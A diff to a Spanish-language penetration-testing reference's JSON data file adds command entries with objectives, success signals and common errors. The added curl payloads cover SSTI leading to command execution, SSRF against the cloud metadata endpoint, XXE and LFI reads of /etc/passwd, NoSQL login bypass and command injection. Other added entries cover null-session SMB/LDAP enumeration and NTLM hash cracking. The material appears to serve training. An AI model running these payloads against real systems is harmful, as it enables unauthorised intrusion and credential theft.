@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 23
+    "totalCommandMetadata": 39
   },
   "tags": [
     "active-directory",
@@ -8533,6 +8533,374 @@
         "Variable o ruta no definida."
       ],
       "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS \"$URL/?name={{7*7}}\"",
+      "objective": "Detectar Server-Side Template Injection",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Si el parametro se evalua, la respuesta contiene 49 en vez del texto literal.",
+      "successSignal": "La pagina devuelve 49 (el motor de plantillas evaluo tu input).",
+      "commonErrors": [
+        "El framework escapa el input: no es vulnerable",
+        "El parametro no se refleja"
+      ],
+      "alternative": "Prueba ${7*7}, #{7*7} o <%= 7*7 %> segun el motor.",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
+      "objective": "Ejecutar comandos via SSTI (Jinja2)",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "SSTI confirmada en un motor tipo Jinja2/Flask"
+      ],
+      "expectedOutput": "La respuesta incluye la salida de id (uid=...).",
+      "successSignal": "Se ejecuta id en el servidor: es RCE.",
+      "commonErrors": [
+        "El sandbox del motor bloquea __globals__",
+        "Motor distinto de Jinja2"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS \"$URL/fetch?url=http://169.254.169.254/latest/meta-data/\"",
+      "objective": "SSRF contra el endpoint de metadatos cloud",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Datos del servicio de metadatos (roles/credenciales IAM en AWS).",
+      "successSignal": "Devuelve metadatos en vez de un error de conexion.",
+      "commonErrors": [
+        "No es un entorno cloud",
+        "IMDSv2 exige un token: prueba la cabecera"
+      ],
+      "alternative": "Rutas gcp: metadata.google.internal.",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS \"$URL/fetch?url=http://127.0.0.1:80/\"",
+      "objective": "Confirmar SSRF apuntando al propio host",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "La respuesta de un servicio interno que no deberias alcanzar desde fuera.",
+      "successSignal": "Ves contenido de 127.0.0.1 servido por el backend.",
+      "commonErrors": [
+        "Lista blanca de dominios",
+        "El puerto interno esta cerrado"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml'",
+      "objective": "Leer ficheros del servidor via XXE",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "El endpoint parsea XML",
+        "Haber creado xxe.xml con la entidad externa"
+      ],
+      "expectedOutput": "El contenido de /etc/passwd embebido en la respuesta.",
+      "successSignal": "Aparece root:x:0:0 en la salida.",
+      "commonErrors": [
+        "Parser con entidades externas deshabilitadas (seguro)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS -X POST $URL/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'",
+      "objective": "Bypass de login por NoSQL injection",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [],
+      "expectedOutput": "Redireccion o token como si las credenciales fueran validas.",
+      "successSignal": "Entras sin conocer la contrasena (el operador $ne siempre es verdadero).",
+      "commonErrors": [
+        "El backend no es NoSQL (Mongo)",
+        "Valida tipos del JSON"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-inyecciones",
+      "command": "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
+      "objective": "Inyeccion de comandos en un parametro",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [],
+      "expectedOutput": "La respuesta incluye uid=... porque id se ejecuto tras tu valor.",
+      "successSignal": "Se ejecuta id concatenado: hay command injection.",
+      "commonErrors": [
+        "Input saneado o sin paso por shell",
+        "Prueba separadores | && $() `id`"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-ficheros-y-ejecucion",
+      "command": "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
+      "objective": "Local File Inclusion: leer un fichero del sistema",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "El contenido de /etc/passwd si el parametro incluye ficheros.",
+      "successSignal": "Aparece root:x:0:0: la ruta es controlable.",
+      "commonErrors": [
+        "Filtro de path traversal",
+        "Base dir fija / extension forzada"
+      ],
+      "alternative": "php://filter/convert.base64-encode/resource=index para leer el codigo fuente.",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-apis-y-autorizacion",
+      "command": "curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN\"",
+      "objective": "Probar IDOR cambiando el id de otro usuario",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": true,
+      "credentialType": "token",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Datos de un usuario que no es el tuyo.",
+      "successSignal": "Accedes a un recurso ajeno con tu propio token.",
+      "commonErrors": [
+        "El backend valida la propiedad del recurso (403)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-apis-y-autorizacion",
+      "command": "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
+      "objective": "Volcar el esquema GraphQL (introspection)",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "La lista de todos los tipos y queries de la API.",
+      "successSignal": "Devuelve el esquema: usalo para encontrar queries sensibles.",
+      "commonErrors": [
+        "Introspection deshabilitada en produccion"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "web-apis-y-autorizacion",
+      "command": "for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done",
+      "objective": "Descubrir metodos HTTP permitidos en un endpoint",
+      "tool": "curl",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "El codigo de estado por cada metodo probado.",
+      "successSignal": "Un metodo peligroso (PUT/DELETE) responde 2xx.",
+      "commonErrors": [
+        "Variable o ruta no definida."
+      ],
+      "alternative": "curl -i -X OPTIONS $URL para leer la cabecera Allow.",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "smbclient -L //$IP -N",
+      "objective": "Listar shares SMB con sesion nula",
+      "tool": "smbclient",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Los shares visibles sin autenticar.",
+      "successSignal": "Se listan shares (hay null session).",
+      "commonErrors": [
+        "STATUS_ACCESS_DENIED: no hay sesion nula"
+      ],
+      "alternative": "nxc smb $IP -u '' -p '' --shares",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "recon-y-servicios",
+      "command": "nxc smb $IP -u '' -p '' --shares",
+      "objective": "Enumerar shares con sesion nula (NetExec)",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Shares y permisos de lectura/escritura sin credenciales.",
+      "successSignal": "Aparecen shares legibles para seguir enumerando.",
+      "commonErrors": [
+        "El servidor rechaza la sesion nula"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "recon-y-servicios",
+      "command": "ldapsearch -x -H ldap://$IP -s base namingContexts",
+      "objective": "Obtener el naming context base del LDAP",
+      "tool": "ldapsearch",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "El DN base del dominio (DC=dominio,DC=local).",
+      "successSignal": "Devuelve namingContexts para acotar futuras consultas.",
+      "commonErrors": [
+        "Bind anonimo deshabilitado"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "hashes-y-cracking",
+      "command": "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
+      "objective": "Crackear un hash NTLM con diccionario",
+      "tool": "hashcat",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [
+        "Hash NTLM guardado en ntlm.hash",
+        "rockyou disponible"
+      ],
+      "expectedOutput": "La contrasena en claro si esta en el diccionario.",
+      "successSignal": "hashcat marca el hash como Cracked.",
+      "commonErrors": [
+        "Modo -m incorrecto para el tipo de hash",
+        "Formato del fichero de hash mal"
+      ],
+      "alternative": "john --format=nt ntlm.hash",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "hashes-y-cracking",
+      "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+      "objective": "Crackear hashes con John y diccionario",
+      "tool": "john",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Contrasenas recuperadas (se ven luego con john --show).",
+      "successSignal": "John encuentra al menos una contrasena.",
+      "commonErrors": [
+        "John no reconoce el formato: pasa --format"
+      ],
+      "alternative": "hashcat con el -m correspondiente al tipo de hash.",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
